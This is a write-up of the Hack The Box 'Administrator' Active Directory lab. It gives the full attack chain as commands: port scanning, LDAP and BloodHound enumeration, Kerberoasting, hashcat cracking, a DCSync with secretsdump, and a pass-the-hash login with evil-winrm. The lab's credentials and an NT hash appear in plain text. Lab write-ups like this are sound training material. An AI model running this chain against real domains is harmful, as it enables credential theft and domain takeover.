---
date: 2025-03-02
categories: [Windows, Medium, AD]
---

![Administrator](https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [nirza](https://app.hackthebox.com/users/800960)        | [Hack The Box](https://www.hackthebox.com/)     | Medium           | Windows   |

---









- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open --min-rate 5000 -Pn sS 10.10.11.42 -oG scan
	nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,52151,56764,60584,60595,60600,60603,60623 -sCV -Pn 10.10.11.42 -oN ports
	```

	![image](https://github.com/user-attachments/assets/7fc4cccc-53ab-49d4-9668-96baf067d0ce)

- I'm trying to pull up something interesting that is shared by smb using the credentials provided by HTB but I can't find anything.
- enumerate the system with [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) bloodhound to see if there are potential ways to escalate privileges.

	```python
	ldapdomaindump -u 'ADMINISTRATOR.HTB\olivia' -p 'ichliebedich' 10.10.11.42
	bloodhound-python -u 'olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb --zip
	```

- I list the users who have SPN set to request a TGS, I find the user ethan and get his hash

	![image](https://github.com/user-attachments/assets/15cd8b79-dac9-425f-8527-629b671ba28b)

	```python
	rdate -n 10.10.11.42; impacket-GetUserSPNs  administrator.htb/olivia:ichliebedich -request
	```

	![image](https://github.com/user-attachments/assets/0f4b516b-70b5-49f2-a884-8b8977b71ec0)

- I break in hash and get the clear text password from the user 

	```python
	hashcat -m 13100 -a 0 TgS_ethan /usr/share/wordlists/rockyou.txt -o cracked.txt
	```
	
	![image](https://github.com/user-attachments/assets/1a099d14-63af-4695-9855-b3faa856a900)

- Consulting bloodhound I see that I can obtain the user hashes by doing a DCSync attack.

	![image](https://github.com/user-attachments/assets/56da476a-9f9b-4704-9594-b75a04af0bd2)

	```python
	impacket-secretsdump administrator.htb/ethan@10.10.11.42
	```

	![image](https://github.com/user-attachments/assets/4ef86308-fadc-4823-b9d1-2d8b23cf904a)

- I get the nt hash from the admin user and connect with it to the system to be able to read the second flag.

	```python
	evil-winrm -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e" -i 10.10.11.42
	```

	![image](https://github.com/user-attachments/assets/636f48b3-51e5-47f0-a538-720f19f1e3e2)
